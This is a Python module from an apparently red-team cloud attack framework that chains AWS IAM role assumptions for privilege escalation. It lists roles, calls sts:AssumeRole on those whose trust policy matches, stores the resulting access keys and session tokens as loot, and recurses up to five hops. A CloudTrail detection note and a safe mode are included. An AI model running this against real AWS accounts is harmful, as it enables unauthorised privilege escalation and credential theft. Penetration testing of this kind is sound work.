# ================================================================
# TECHNIQUE: escalation/assume_role_chain
# ----------------------------------------------------------------
# TACTIC:    Privilege Escalation (TA0004)
# TECHNIQUE: T1548.005 — Abuse Elevation Control Mechanism:
#            Temporary Elevated Cloud Access
#
# PURPOSE:   Enumerate and follow the chain of IAM roles the
#            current identity can assume via sts:AssumeRole.
#            Each assumable role is assumed, its temporary
#            credentials are stored as a child credential in the
#            workspace, and the chain is followed recursively.
#
# PROVIDERS: AWS
#
# HOW IT WORKS:
#   1. Lists all IAM roles via iam:ListRoles (fails gracefully
#      if permission denied; falls back to roles discovered via
#      enum_iam evidence in the workspace).
#   2. For each role whose trust policy allows the current
#      principal to assume it, calls sts:AssumeRole.
#   3. Stores the derived credentials in the workspace database
#      as a child credential (derived_from_id = current cred).
#   4. Recursively follows chains up to MAX_DEPTH hops.
#
# SESSION CONTRACT:
#   AWS — ctx.session is a boto3.Session (already authenticated)
#
# DETECTION (Blue Team):
#   AWS — CloudTrail: sts:AssumeRole (all hops)
#         CloudTrail: iam:ListRoles
#   Alert: sts:AssumeRole calls in rapid succession from a single
#          principal (role-chaining indicator).
#
# MITRE ATT&CK: T1548.005, T1550.001
#
# SAFE:     No — sts:AssumeRole is an active API call that creates
#           a new session. Use safe_mode to enumerate without
#           assuming. Currently safe_mode prints which roles WOULD
#           be assumed without calling sts:AssumeRole.
# ================================================================

from __future__ import annotations

import json
import logging
from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import technique

# ----------------------------------------------------------------
# Loot schema — CloudFox-style output (loot.csv / table.txt)
# ----------------------------------------------------------------
LOOT_ITEMS_KEY = 'chains'
LOOT_SCHEMA = [
    ('starting_principal', 'starting_principal'),
    ('assumed_role_arn', 'assumed_role_arn'),
    ('depth', 'depth'),
    ('notes', None),
]

logger = logging.getLogger(__name__)

MAX_DEPTH = 5  # Maximum role-chain depth to prevent infinite recursion


def format_chain_result(result: Any) -> None:
    """Decentralized formatter for assume_role_chain."""
    from rich.table import Table

    from quantum_mechanic.shell.formatters import console

    data = result.data
    chains = data.get("chains", [])

    if not chains:
        console.print("  [dim]No exploitable role chains found.[/dim]")
        return

    console.print(f"  [bold red]⚠  {len(chains)} ROLE PIVOT PATH(S) DISCOVERED[/bold red]")

    for i, chain in enumerate(chains, 1):
        tbl = Table(box=None, padding=(0, 2), title=f"Pivot Path #{i}", title_align="left")
        tbl.add_column("Hop", justify="right", style="dim")
        tbl.add_column("Role ARN / Action", style="bold white")
        tbl.add_column("Status", justify="center")

        # Start principal
        tbl.add_row("0", data.get("starting_principal", "unknown"), "[green]START[/green]")

        # We only have one role per chain item in the current logic,
        # but the data structure stores it flattened.
        status = "[bold green]ASSUMED[/bold green]" if chain.get("assumed") else "[yellow]CAN ASSUME[/yellow]"
        if chain.get("error"):
            status = f"[red]FAILED ({chain['error']})[/red]"

        tbl.add_row(str(chain.get("depth", 0) + 1), chain.get("role_arn", "unknown"), status)

        console.print(tbl)


@technique(
    technique_id="escalation/assume_role_chain",
    tactic='privilege_escalation',
    mitre_id="T1548",
    providers=["aws"],
    severity="high",
    safe=False,
    description="Enumerate and follow IAM role trust chains via sts:AssumeRole to extract derived credentials.",
    formatter=format_chain_result,
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """Execute role-chain assumption.

    Args:
        ctx: Execution context with active AWS credential.

    Returns:
        Dictionary of assumed roles and their derived credential IDs.
    """
    try:
        # Identify the caller so we know what to match in trust policies
        sts = ctx.session.client("sts")
        caller = sts.get_caller_identity()
        principal_arn = caller.get("Arn", "")
        account_id = caller.get("Account", "")

        ctx.log(f"sts:GetCallerIdentity → {principal_arn}")

        # ----------------------------------------------------------
        # Enumerate assumable roles (up to MAX_DEPTH hops)
        # ----------------------------------------------------------
        chains: list[dict[str, Any]] = []
        _follow_chain(
            ctx=ctx,
            session=ctx.session,
            current_principal_arn=principal_arn,
            account_id=account_id,
            parent_cred_id=ctx.credential_id,
            chains=chains,
            depth=0,
        )

        return {
            "provider": "aws",
            "starting_principal": principal_arn,
            "account_id": account_id,
            "chains": chains,
            "total": len(chains),
            "safe_mode": ctx.safe_mode,
        }

    except Exception as e:
        logger.error("assume_role_chain failed: %s", e)
        return {"error": str(e), "chains": []}


# ================================================================
# Chain traversal — recursive BFS up to MAX_DEPTH
# ================================================================

def _follow_chain(
    *,
    ctx: ExecutionContext,
    session: Any,
    current_principal_arn: str,
    account_id: str,
    parent_cred_id: int,
    chains: list[dict[str, Any]],
    depth: int,
) -> None:
    """Recursively enumerate and assume roles reachable from the current session.

    Args:
        ctx: Execution context (for workspace writes and safe_mode check)
        session: The boto3.Session to use for this hop
        current_principal_arn: The ARN calling AssumeRole
        account_id: AWS account ID for scope
        parent_cred_id: Workspace credential ID this chain derives from
        chains: Accumulated chain results (mutated in place)
        depth: Current recursion depth (stops at MAX_DEPTH)
    """
    if depth >= MAX_DEPTH:
        logger.debug("Max chain depth (%d) reached, stopping.", MAX_DEPTH)
        return

    try:
        from botocore.exceptions import ClientError
    except ImportError:
        return

    iam = session.client("iam")
    sts = session.client("sts")

    # ----------------------------------------------------------
    # Discover roles whose trust policy permits this principal.
    # Falls back gracefully if iam:ListRoles is denied.
    # ----------------------------------------------------------
    assumable_roles: list[str] = []
    try:
        paginator = iam.get_paginator("list_roles")
        for page in paginator.paginate():
            for role in page.get("Roles", []):
                if _trust_allows(role.get("AssumeRolePolicyDocument", {}), current_principal_arn):
                    assumable_roles.append(role["Arn"])

        ctx.log(f"iam:ListRoles → {len(assumable_roles)} assumable role(s) at depth {depth}")
    except ClientError as e:
        code = e.response.get("Error", {}).get("Code", "")
        if code in ("AccessDenied", "AccessDeniedException"):
            logger.info("iam:ListRoles denied — no role discovery at depth %d", depth)
        else:
            logger.warning("iam:ListRoles error: %s", e)
        return

    for role_arn in assumable_roles:
        # ----------------------------------------------------------
        # Safe mode — report what WOULD be assumed without calling
        # AssumeRole.
        # ----------------------------------------------------------
        if ctx.safe_mode:
            chains.append({
                "role_arn": role_arn,
                "depth": depth,
                "assumed": False,
                "safe_mode": True,
                "credential_id": None,
            })
            continue

        # ----------------------------------------------------------
        # Actively assume the role.
        # ----------------------------------------------------------
        try:
            resp = sts.assume_role(
                RoleArn=role_arn,
                RoleSessionName="qm-assume-role",
                DurationSeconds=3600,
            )
            creds = resp["Credentials"]

            ctx.log(f"sts:AssumeRole → assumed {role_arn}")

            # ----------------------------------------------------------
            # Store the derived credential in the workspace
            # ----------------------------------------------------------
            secret = json.dumps({
                "aws_access_key_id": creds["AccessKeyId"],
                "aws_secret_access_key": creds["SecretAccessKey"],
                "aws_session_token": creds["SessionToken"],
            })
            child_cred_id = ctx.workspace.add_credential(
                provider="aws",
                credential_type="assumed_role",
                secret_data=secret,
                friendly_name=f"assumed:{role_arn.split('/')[-1]}",
                obtained_via=f"sts:AssumeRole from cred #{parent_cred_id}",
                derived_from_id=parent_cred_id,
            )

            chains.append({
                "role_arn": role_arn,
                "depth": depth,
                "assumed": True,
                "credential_id": child_cred_id,
                "expiration": str(creds.get("Expiration", "")),
            })

            # ----------------------------------------------------------
            # Recurse: follow the chain from this new role
            # ----------------------------------------------------------
            import boto3
            child_session = boto3.Session(
                aws_access_key_id=creds["AccessKeyId"],
                aws_secret_access_key=creds["SecretAccessKey"],
                aws_session_token=creds["SessionToken"],
            )
            child_sts = child_session.client("sts")
            child_identity = child_sts.get_caller_identity()

            _follow_chain(
                ctx=ctx,
                session=child_session,
                current_principal_arn=child_identity.get("Arn", role_arn),
                account_id=account_id,
                parent_cred_id=child_cred_id,
                chains=chains,
                depth=depth + 1,
            )

        except ClientError as e:
            code = e.response.get("Error", {}).get("Code", "")
            logger.info("Failed to assume %s (%s)", role_arn, code)
            chains.append({
                "role_arn": role_arn,
                "depth": depth,
                "assumed": False,
                "error": code,
                "credential_id": None,
            })


# ================================================================
# Trust policy evaluation
# ================================================================

def _trust_allows(policy_doc: dict | str, principal_arn: str) -> bool:
    """Return True if the trust policy document allows the given principal.

    This does a simple substring match on the principal ARN.  It handles
    AWS-managed policies that use account-level wildcards (e.g. 'root').

    Args:
        policy_doc: The AssumeRolePolicyDocument dict (or JSON string)
        principal_arn: ARN to check

    Returns:
        True if the trust policy appears to allow AssumeRole from this ARN.
    """
    if isinstance(policy_doc, str):
        try:
            policy_doc = json.loads(policy_doc)
        except json.JSONDecodeError:
            return False

    account_id = ""
    if "::" in principal_arn:
        parts = principal_arn.split("::")
        if len(parts) > 1:
            account_id = parts[1].split(":")[0]

    for stmt in policy_doc.get("Statement", []):
        if stmt.get("Effect") != "Allow":
            continue
        action = stmt.get("Action", "")
        actions = [action] if isinstance(action, str) else action
        if not any(a in ("sts:AssumeRole", "sts:*", "*") for a in actions):
            continue

        principal = stmt.get("Principal", {})
        if principal == "*":
            return True
        if isinstance(principal, str):
            if principal_arn in principal or (account_id and account_id in principal):
                return True
        if isinstance(principal, dict):
            aws_principals = principal.get("AWS", [])
            if isinstance(aws_principals, str):
                aws_principals = [aws_principals]
            for p in aws_principals:
                if (
                    principal_arn in p
                    or (account_id and account_id in p)
                    or p == "*"
                ):
                    return True

    return False
